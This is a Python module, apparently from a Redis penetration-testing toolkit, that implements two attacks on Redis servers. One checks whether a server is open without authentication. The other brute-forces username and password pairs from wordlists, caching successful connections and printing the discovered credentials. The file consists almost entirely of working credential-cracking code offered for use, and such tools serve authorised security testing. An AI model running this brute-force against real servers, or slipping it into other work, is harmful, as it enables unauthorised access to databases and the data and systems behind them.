import sys
# setting path
sys.path.insert(0, "../../../")

from helper.connection import get_cached_connection_options, is_connection_working, get_db_connection, cache_db_connection, get_cached_db_connection
from helper.utils import read_file, print_kv_pairs
from helper.errormap import *

from config.settings import DEFAULT_USERS_WORDLIST, DEFAULT_PASSWD_WORDLIST


CONNECTION_OPTIONS = get_cached_connection_options()
WEAK_AUTH_CREDS = {}


AVAILABLE_ATTACKS = [
    "auth_existence_check",
    "crack_weak_auth"
]



def has_no_auth_help():
    return "\nReturns True if Redis server has no auth.\n" \
    "If authentication is enabled, False is returned.\n" \
    "If authentication is not enabled, True is returned.\n" \
    "In any other case, the program exits with the relevant\n" \
    "status code!\n\n" \
    "Currently, it's either Redis not running (ENO_CONN) or\n" \
    "the credentials are invalid/the user is disabled\n" \
    "(ENO_INVALID_CREDS | ENO_USER_DISABLED)\n"



def has_no_auth(redis):
    # Connect to redis client without auth
    # and report if it works or not

    conn_status = is_connection_working(redis)

    if conn_status == E_OK:
        # E_OK
        # Authentication is not required
        # Redis server is open to use...
        return True

    elif conn_status == ENO_CONN:
        # ENO_CONN
        print("Redis connection not working!\nAre you sure Redis is running on the specified port?\nIt is suggested to check for this before continuing with any other attacks.\nExiting...\n")
        exit(ENO_CONN)

    # Won't happen!
    elif conn_status == (ENO_INVALID_CREDS | ENO_USER_DISABLED):
        # ENO_INVALID_CREDS | ENO_USER_DISABLED
        print("Invalid credentials or the user is disabled!\nExiting...")
        exit(ENO_INVALID_CREDS | ENO_USER_DISABLED)

    else:
        # ENO_AUTH
        # Authentication is required!
        return False



def check_credentials_help():
    return "\nIt creates a connection to the Redis server with the\n" \
    "specified credentials and reports if the credentials\n" \
    "resulting in a successful connection or not!\n\n" \
    "If the connection works, True is returned and the connection\n" \
    "is cached for later use.\n\n" \
    "If the connection doesn't works, False is returned!\n\n" \
    "If any exception occurs (possible when the username/password)\n" \
    "contains some special characters, then also False is returned.\n" \
    "For such cases, a message is reported to the user so they can\n" \
    "try such credentials manually.\n"



def check_credentials(username = None, password = None):

    # TODO: Remove the redis-py library later and use RESP to perform the attack...

    credentials = {
        "username": username,
        "password": password
    }

    global CONNECTION_OPTIONS
    CONNECTION_OPTIONS = { **CONNECTION_OPTIONS, **credentials }

    try:
        # Getting the client with proper authentication!
        redis = get_db_connection(CONNECTION_OPTIONS, auth = True)
    except ValueError as e:
        print("[Exception]: The username/password contains some special characters, please try this combination manually.")
        # TODO: See if we can address this?
        # 74k&^*nh#$
        # Hash is the special character here and that's causing the parsing confusion...
        print (f"username: '{username}'\npassword: '{password}'")
        # sleep(1)
        return False

    conn_status = is_connection_working(redis)

    # Cache connection iff conn_status == E_OK
    return conn_status == E_OK and cache_db_connection(redis)



def crack_auth_help():
    return "\nTries the provided username-password pairs\n" \
    "and stores the credentials which result in\n" \
    "a successful authentication!\n\n" \
    "Once the first set of credentials are\n" \
    "retrieved, user is prompted for continuation\n" \
    "if this attack."



def crack_auth(users_file, passwd_file):

    # TODO: Optimize this later.

    users_list = read_file(users_file).split("\n")
    passwd_list = read_file(passwd_file).split("\n")

    users_list.remove("default")
    users_list = ["default"] + users_list

    for user in users_list:
        for passwd in passwd_list:
            if check_credentials(user, passwd):
                print (f"[*] Found credentials:\n{user} => {passwd}")

                global WEAK_AUTH_CREDS
                WEAK_AUTH_CREDS[user] = passwd
                break
        else:
            continue

        proceed = input("\n[*] Do you wish to find more credentials? (default='no') [y/N] ") or "N"

        if proceed.lower() == "y":
            continue
        else:
            break



def auth_existence_check_help():
    return "\nChecks if the Redis server has\n" \
    "authentication enabled or not.\n\n" \
    "A return value of True indicates\n" \
    "no authentication is required,\n" \
    "whereas False indicates that\n" \
    "authentication is required.\n"



def auth_existence_check():

    # Can pass connection options to this function
    redis = get_cached_db_connection()

    if has_no_auth(redis):
        # Has no authentication
        print ("\n[*] Open Redis server - no authentication required!\n")
        # Has no authentication
        return True

    else:
        print ("\nAuthentication is required!\n")
        # Has authentication
        return False



def crack_weak_auth_help():
    return "\nCracks the weak authentication and displays the\n" \
    "discovered credentials.\n\n" \
    "[NOTE] Kindly run this attack only if the Redis server is\n" \
    "reported to be auth protected. For that run the\n" \
    "`auth_existence_check` attack!\n"



def crack_weak_auth():

    users_wordlist = input(f"\nProvide username list (default='{DEFAULT_USERS_WORDLIST}') ") or DEFAULT_USERS_WORDLIST
    passwd_wordlist = input(f"Provide password list (default='{DEFAULT_PASSWD_WORDLIST}') ") or DEFAULT_PASSWD_WORDLIST

    crack_auth(users_wordlist, passwd_wordlist)

    print ()
    print_kv_pairs(WEAK_AUTH_CREDS, label = "Discovered Credentials")
    print ()



def get_available_attacks():
    return AVAILABLE_ATTACKS



def perform_auth_attack(attack_name):
    if attack_name in AVAILABLE_ATTACKS:
        globals()[attack_name]()
    else:
        print ("\n[-] Invalid attack name.\n")



if __name__ == "__main__":
    if not auth_existence_check():
        # If there is authentication, then perform weak auth attack,
        # otherwise, there is no need for this attack!
        crack_weak_auth()